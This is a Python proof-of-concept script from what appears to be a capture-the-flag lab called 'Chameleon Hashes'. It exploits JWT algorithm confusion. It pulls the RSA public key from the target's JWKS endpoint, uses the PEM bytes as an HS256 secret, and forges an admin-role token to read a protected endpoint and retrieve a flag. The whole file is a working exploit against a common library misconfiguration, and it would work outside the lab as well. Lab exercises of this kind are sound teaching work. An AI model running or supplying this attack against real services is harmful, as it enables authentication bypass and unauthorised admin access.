#!/usr/bin/env python3
"""
Lab #4 - Chameleon Hashes
Vulnerability : algorithm confusion RS256 -> HS256 (jsonwebtoken misconfigured)
Attack        : fetch RSA public key from JWKS, use PEM bytes as HS256 secret
"""
import argparse, base64, hashlib, hmac, json, sys
import requests
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #4 - Chameleon Hashes PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

def jwk_to_pem(n_b64: str, e_b64: str) -> bytes:
    n = int.from_bytes(b64url_dec(n_b64), 'big')
    e = int.from_bytes(b64url_dec(e_b64), 'big')
    pub = RSAPublicNumbers(e, n).public_key()
    return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

def forge_hs256(payload: dict, secret: bytes) -> str:
    h = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    p = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64url_enc(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    return f'{h}.{p}.{sig}'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    log.info(f'Target: {base_url}')

    r = requests.post(f'{base_url}/api/login', json={'username': 'hacker'}, timeout=5)
    r.raise_for_status()
    log.success('Logged in as analyst')

    jwks = requests.get(f'{base_url}/.well-known/jwks.json', timeout=5).json()
    key  = jwks['keys'][0]
    log.success(f"JWK fetched (kid={key['kid']})")

    pem = jwk_to_pem(key['n'], key['e'])
    log.info(f'Public key reconstructed ({len(pem)} bytes)')

    forged = forge_hs256({'name': 'hacker', 'role': 'admin'}, pem)
    log.info(f'Forged token: {forged[:60]}...')

    r = requests.get(f'{base_url}/api/admin/keys', cookies={'session': forged}, timeout=5)
    if r.status_code != 200:
        log.failure(f'Unexpected status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
